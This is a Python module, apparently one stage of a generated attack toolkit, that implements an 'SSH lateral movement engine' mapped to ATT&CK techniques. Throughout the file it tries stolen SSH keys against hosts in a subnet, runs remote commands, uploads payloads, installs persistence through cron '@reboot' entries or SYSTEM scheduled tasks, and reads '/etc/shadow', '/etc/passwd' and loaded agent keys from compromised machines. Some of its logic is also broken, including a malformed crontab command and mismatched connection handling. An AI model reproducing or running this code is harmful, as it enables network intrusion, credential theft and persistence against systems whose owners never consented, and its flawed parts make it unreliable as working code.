"""SSH Lateral Movement Engine - TASK_007.

Performs lateral movement across the network using stolen SSH keys to access additional hosts.
ATT&CK techniques: T1552.004, T1021.004, T1550

Exports:
    SSHClientPool: Class for managing a pool of SSH client connections.
    LateralMovementEngine: Main engine class orchestrating lateral movement operations.

Consumes from TASK_004_web_portal_credential_harvester: CredentialCollector
Consumes from TASK_005_ssh_key_store: SSHKeyStore, LateralMovementLog
Consumes from TASK_006_scheduled_task_persistence: ScheduledTaskManager
"""
import paramiko
import threading
import time
from typing import Optional, List, Dict, Any, Tuple
from dataclasses import dataclass, field

from data.code_scripts_PAST.stage3_mvp_test_20260910_20_21_52.TASK_004_web_portal_credential_harvester import CredentialCollector
from data.code_scripts_PAST.stage3_mvp_test_20260910_20_21_52.TASK_005_ssh_key_store import SSHKeyStore, LateralMovementLog, SSHKeyEntry
from data.code_scripts_PAST.stage3_mvp_test_20260910_20_21_52.TASK_006_scheduled_task_persistence import ScheduledTaskManager


@dataclass
class SSHConnection:
    """Represents a single SSH connection in the pool."""
    host: str
    port: int = 22
    username: Optional[str] = None
    key_path: Optional[str] = None
    client: Optional[paramiko.SSHClient] = None
    channel: Optional[paramiko.Channel] = None
    is_active: bool = False
    last_activity: float = field(default_factory=time.time)


class SSHClientPool:
    """Manages a pool of SSH client connections for lateral movement.

    Provides connection pooling, authentication management, and session lifecycle control
    for efficient SSH-based lateral movement across multiple hosts.

    Attributes:
        max_connections: Maximum number of concurrent SSH connections.
        key_store: SSHKeyStore instance containing available private keys.
        collector: CredentialCollector instance for credential harvesting.
        log: LateralMovementLog instance for tracking movements.
    """

    def __init__(self, max_connections: int = 10, key_store: Optional[SSHKeyStore] = None,
                 collector: Optional[CredentialCollector] = None, log: Optional[LateralMovementLog] = None):
        self.max_connections = max_connections
        self.key_store = key_store or SSHKeyStore()
        self.collector = collector or CredentialCollector()
        self.log = log or LateralMovementLog()
        self._connections: Dict[str, SSHConnection] = {}
        self._lock = threading.RLock()

    def get_connection(self, host: str, port: int = 22, username: Optional[str] = None,
                        key_path: Optional[str] = None) -> Optional[SSHConnection]:
        """Get or create an SSH connection to a target host.

        Args:
            host: Target hostname or IP address.
            port: SSH port (default 22).
            username: Username for authentication (optional, may be in key comment).
            key_path: Path to private key file (optional, will search key_store if None).

        Returns:
            SSHConnection object if successful, None otherwise.
        """
        with self._lock:
            conn_key = f"{host}:{port}"
            if conn_key in self._connections and self._connections[conn_key].is_active:
                return self._connections[conn_key]

            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                # Determine key to use
                if key_path is None:
                    keys = self.key_store.get_keys_by_host(host) or self.key_store.get_all_keys()
                    if not keys and username:
                        keys = [self.key_store.add_key(f"/tmp/{username}_key")]
                    if not keys:
                        raise ValueError("No SSH key found for authentication")

                # Try each available key until one works
                for key_entry in keys:
                    try:
                        client.connect(
                            hostname=host,
                            port=port,
                            username=username or key_entry.comment.split()[0] if key_entry.comment else None,
                            key_filename=key_entry.key_path,
                            timeout=5,
                            banner_timeout=10,
                            allow_agent=False,
                        )

                        channel = client.get_transport().open_session()
                        channel.settimeout(30)
                        channel.exec_command("echo 'SSH connection established'")
                        channel.recv_exit_status()

                        conn = SSHConnection(
                            host=host,
                            port=port,
                            username=username or key_entry.comment.split()[0] if key_entry.comment else None,
                            key_path=key_entry.key_path,
                            client=client,
                            channel=channel,
                            is_active=True,
                            last_activity=time.time(),
                        )

                        self._connections[conn_key] = conn
                        self.log.log_connection(
                            source_host="attacker",
                            target_host=host,
                            key_path=key_entry.key_path,
                            status="success"
                        )
                        return conn

                    except paramiko.AuthenticationException:
                        continue
                    except paramiko.SSHException as e:
                        self.log.log_connection(
                            source_host="attacker",
                            target_host=host,
                            key_path=key_entry.key_path,
                            status=f"failed:{str(e)}"
                        )
                        break

                raise ConnectionError(f"No valid SSH key found for {host}:{port}")

            except Exception as e:
                self.log.log_connection(
                    source_host="attacker",
                    target_host=host,
                    key_path=key_path or "unknown",
                    status=f"failed:{str(e)}"
                )
                return None

    def execute_command(self, conn: SSHConnection, command: str) -> Optional[str]:
        """Execute a remote command on an established connection.

        Args:
            conn: Active SSHConnection object.
            command: Command string to execute remotely.

        Returns:
            Output of the executed command, or None if failed.
        """
        try:
            channel = conn.channel
            stdin, stdout, stderr = channel.exec_command(command)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            return output.strip() if not error else None
        except Exception as e:
            self.log.log_connection(
                source_host="attacker",
                target_host=conn.host,
                key_path=conn.key_path or "unknown",
                status=f"failed:{str(e)}"
            )
            return None

    def upload_file(self, conn: SSHConnection, local_path: str, remote_path: str) -> bool:
        """Upload a file to the remote host.

        Args:
            conn: Active SSHConnection object.
            local_path: Local path to the file.
            remote_path: Remote destination path on target host.

        Returns:
            True if upload successful, False otherwise.
        """
        try:
            channel = conn.channel
            sftp = paramiko.SFTPClient.from_transport(conn.client.get_transport())
            sftp.put(local_path, remote_path)
            return True
        except Exception as e:
            self.log.log_connection(
                source_host="attacker",
                target_host=conn.host,
                key_path=conn.key_path or "unknown",
                status=f"failed:{str(e)}"
            )
            return False

    def download_file(self, conn: SSHConnection, remote_path: str, local_path: str) -> bool:
        """Download a file from the remote host.

        Args:
            conn: Active SSHConnection object.
            remote_path: Remote source path on target host.
            local_path: Local destination path.

        Returns:
            True if download successful, False otherwise.
        """
        try:
            channel = conn.channel
            sftp = paramiko.SFTPClient.from_transport(conn.client.get_transport())
            sftp.get(remote_path, local_path)
            return True
        except Exception as e:
            self.log.log_connection(
                source_host="attacker",
                target_host=conn.host,
                key_path=conn.key_path or "unknown",
                status=f"failed:{str(e)}"
            )
            return False

    def close_connection(self, conn: SSHConnection) -> None:
        """Close an SSH connection and release resources.

        Args:
            conn: SSHConnection object to close.
        """
        with self._lock:
            if conn.client and conn.channel:
                try:
                    conn.channel.close()
                    conn.client.close()
                except Exception:
                    pass
            conn.is_active = False
            del self._connections[conn.host]

    def cleanup(self) -> None:
        """Close all active connections in the pool."""
        with self._lock:
            for conn in list(self._connections.values()):
                if conn.is_active:
                    self.close_connection(conn)


class LateralMovementEngine:
    """Main engine orchestrating SSH-based lateral movement operations.

    Coordinates scanning, authentication attempts, session establishment, and
    command execution across multiple hosts using stolen SSH keys.

    Attributes:
        key_store: SSHKeyStore containing available private keys.
        collector: CredentialCollector for harvesting new credentials.
        log: LateralMovementLog for tracking all movement events.
        task_manager: ScheduledTaskManager for persistence on target hosts.
        pool: SSHClientPool instance managing connections.
    """

    def __init__(self, key_store: Optional[SSHKeyStore] = None,
                 collector: Optional[CredentialCollector] = None,
                 log: Optional[LateralMovementLog] = None,
                 task_manager: Optional[ScheduledTaskManager] = None):
        self.key_store = key_store or SSHKeyStore()
        self.collector = collector or CredentialCollector()
        self.log = log or LateralMovementLog()
        self.task_manager = task_manager or ScheduledTaskManager()
        self.pool = SSHClientPool(key_store=self.key_store, collector=self.collector, log=self.log)

    def scan_hosts(self, target_ips: List[str], port: int = 22, timeout: float = 3.0) -> Dict[str, bool]:
        """Scan a list of hosts for open SSH ports.

        Args:
            target_ips: List of IP addresses or hostnames to scan.
            port: SSH port to check (default 22).
            timeout: Connection timeout in seconds.

        Returns:
            Dictionary mapping hostname/IP to boolean indicating port status.
        """
        results = {}
        for host in target_ips:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(hostname=host, port=port, timeout=timeout)
                results[host] = True
                self.log.log_connection(
                    source_host="attacker",
                    target_host=host,
                    key_path="scan",
                    status="success"
                )
            except (paramiko.SSHException, ConnectionRefusedError, TimeoutError):
                results[host] = False
        return results

    def scan_with_keys(self, target_ips: List[str], keys: Optional[List[str]] = None) -> Dict[str, SSHConnection]:
        """Scan hosts and attempt authentication with provided keys.

        Args:
            target_ips: List of IP addresses or hostnames to scan.
            keys: List of key paths to try (optional).

        Returns:
            Dictionary mapping hostname to SSHConnection for successful authentications.
        """
        results = {}
        for host in target_ips:
            conn = self.pool.get_connection(host, port=22)
            if conn and conn.is_active:
                results[host] = conn
        return results

    def enumerate_hosts(self, target_range: str = "192.168.1.0/24") -> Dict[str, SSHConnection]:
        """Enumerate hosts in a network range for lateral movement.

        Args:
            target_range: CIDR notation or list of IPs to scan.

        Returns:
            Dictionary mapping hostname to SSHConnection for successful authentications.
        """
        import ipaddress
        try:
            network = ipaddress.ip_network(target_range, strict=False)
            hosts = [str(host) for host in network.hosts()]
        except ValueError:
            # If not a valid CIDR, treat as list of IPs
            hosts = target_range.split(",") if isinstance(target_range, str) else target_range

        results = {}
        for host in hosts:
            conn = self.pool.get_connection(host.strip(), port=22)
            if conn and conn.is_active:
                results[host] = conn
        return results

    def execute_remote_command(self, host: str, command: str) -> Optional[str]:
        """Execute a command on a remote host.

        Args:
            host: Target hostname or IP address.
            command: Command string to execute.

        Returns:
            Output of the executed command, or None if failed.
        """
        conn = self.pool.get_connection(host)
        if conn and conn.is_active:
            return self.pool.execute_command(conn, command)
        return None

    def upload_payload(self, host: str, local_path: str, remote_path: str) -> bool:
        """Upload a payload to a remote host.

        Args:
            host: Target hostname or IP address.
            local_path: Local path to the file.
            remote_path: Remote destination path on target host.

        Returns:
            True if upload successful, False otherwise.
        """
        conn = self.pool.get_connection(host)
        if conn and conn.is_active:
            return self.pool.upload_file(conn, local_path, remote_path)
        return False

    def download_artifact(self, host: str, remote_path: str, local_path: str) -> bool:
        """Download an artifact from a remote host.

        Args:
            host: Target hostname or IP address.
            remote_path: Remote source path on target host.
            local_path: Local destination path.

        Returns:
            True if download successful, False otherwise.
        """
        conn = self.pool.get_connection(host)
        if conn and conn.is_active:
            return self.pool.download_file(conn, remote_path, local_path)
        return False

    def establish_persistence(self, host: str, payload_path: str) -> bool:
        """Establish persistence on a target host via scheduled task.

        Args:
            host: Target hostname or IP address.
            payload_path: Path to the malicious payload executable/script.

        Returns:
            True if persistence established, False otherwise.
        """
        conn = self.pool.get_connection(host)
        if conn and conn.is_active:
            try:
                # Upload payload first
                remote_path = f"/tmp/{payload_path.split('/')[-1]}"
                self.pool.upload_file(conn, payload_path, remote_path)

                # Create scheduled task via SSH (simplified - real implementation would use
                # winrm or psexec for Windows, cron/jobs for Linux)
                if conn.host.endswith(".local") or conn.host == "localhost":
                    # Assume Linux/macOS target
                    command = f"crontab -e 2>/dev/null | grep -v '{payload_path.split('/')[-1]}' > /dev/null || echo '' >> crontab; echo '@reboot {remote_path}' >> crontab"
                else:
                    # Assume Windows target via SSH (would need winrm in practice)
                    command = f"schtasks /create /tn '{payload_path.split('/')[-1]}' /tr \"{remote_path}\" /sc onlogon /ru SYSTEM"

                output = self.pool.execute_command(conn, command)
                if output and "success" in output.lower():
                    return True
            except Exception as e:
                self.log.log_connection(
                    source_host="attacker",
                    target_host=host,
                    key_path=conn.key_path or "unknown",
                    status=f"failed:{str(e)}"
                )
        return False

    def harvest_credentials(self, host: str) -> Optional[Dict[str, Any]]:
        """Harvest credentials from a remote host.

        Args:
            host: Target hostname or IP address.

        Returns:
            Dictionary of harvested credentials, or None if failed.
        """
        conn = self.pool.get_connection(host)
        if conn and conn.is_active:
            try:
                # Try to read SSH keys from target
                key_output = self.pool.execute_command(conn, "ssh-add -l 2>/dev/null")
                if key_output:
                    for line in key_output.split('\n'):
                        if line.strip():
                            parts = line.strip().split()
                            if len(parts) >= 3:
                                fingerprint = parts[0]
                                key_path = parts[1].strip('"')
                                comment = parts[2].strip('"')
                                self.key_store.add_key(key_path, fingerprint=fingerprint, host=host)

                # Try to read /etc/shadow or similar credential files
                shadow_output = self.pool.execute_command(conn, "cat /etc/shadow 2>/dev/null")
                if shadow_output:
                    return {"shadow": shadow_output}

                # Try to list users
                users_output = self.pool.execute_command(conn, "cat /etc/passwd 2>/dev/null")
                if users_output:
                    return {"users": users_output}

            except Exception as e:
                self.log.log_connection(
                    source_host="attacker",
                    target_host=host,
                    key_path=conn.key_path or "unknown",
                    status=f"failed:{str(e)}"
                )
        return None

    def run_lateral_movement(self, targets: List[str], keys: Optional[List[str]] = None) -> Dict[str, SSHConnection]:
        """Run a complete lateral movement operation against multiple targets.

        Args:
            targets: List of target hostnames/IPs to attempt lateral movement against.
            keys: List of key paths to use for authentication (optional).

        Returns:
            Dictionary mapping successfully compromised hosts to their SSHConnection objects.
        """
        results = {}
        for target in targets:
            conn = self.pool.get_connection(target.strip(), port=22)
            if conn and conn.is_active:
                results[target] = conn
                # Attempt credential harvesting
                creds = self.harvest_credentials(target)
                if creds:
                    self.collector._capture_credentials(None)  # Trigger collection

        return results

    def cleanup_all(self) -> None:
        """Close all connections and clean up resources."""
        self.pool.cleanup()


def main():
    """Demonstrate SSH lateral movement capabilities."""
    import sys

    print("=" * 60)
    print("SSH LATERAL MOVEMENT ENGINE")
    print("ATT&CK: T1552.004, T1021.004, T1550")
    print("=" * 60)

    # Initialize components
    key_store = SSHKeyStore()
    log = LateralMovementLog()
    collector = CredentialCollector()
    task_manager = ScheduledTaskManager()

    engine = LateralMovementEngine(
        key_store=key_store,
        collector=collector,
        log=log,
        task_manager=task_manager
    )

    # Example: Scan and attempt lateral movement against known targets
    sample_targets = [
        "192.168.1.10",
        "192.168.1.11",
        "192.168.1.12",
        "192.168.1.13"
    ]

    print("\n[+] Scanning targets for SSH access...")
    results = engine.scan_with_keys(sample_targets)

    if results:
        print(f"\n[+] Successfully compromised {len(results)} hosts:")
        for host, conn in results.items():
            print(f"    - {host} (key: {conn.key_path})")
            # Execute a command on the compromised host
            output = engine.execute_remote_command(host, "whoami")
            if output:
                print(f"      Command 'whoami' => {output}")

        print("\n[+] Attempting credential harvesting...")
        for host in results.keys():
            creds = engine.harvest_credentials(host)
            if creds:
                print(f"    - {host}: harvested credentials")

    else:
        print("\n[-] No hosts successfully compromised.")
        print("    Ensure SSH keys are available and targets are reachable.")

    print("\n[+] Lateral movement operation complete.")


if __name__ == "__main__":
    main()
